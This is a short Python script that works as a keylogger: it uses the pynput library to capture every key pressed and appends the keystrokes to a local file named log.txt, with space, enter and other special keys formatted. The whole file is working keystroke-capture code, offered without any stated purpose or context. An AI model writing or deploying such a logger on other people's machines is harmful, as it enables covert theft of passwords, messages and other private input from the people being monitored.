from pynput.keyboard import Listener

def addtofile(key):
    keydata = str(key).replace("'", "") 
    try:
        with open("log.txt", 'a') as f:
            if keydata == 'Key.space':
                f.write(' ')
            elif keydata == 'Key.enter':
                f.write('\n')
            elif keydata.startswith("Key"):
                f.write(f' [{keydata}] ')
            else:
                print(keydata)
                f.write(keydata)
    except Exception as e:

        print(f"Error writing to file: {e}")

with Listener(on_press=addtofile) as l:
    l.join()
    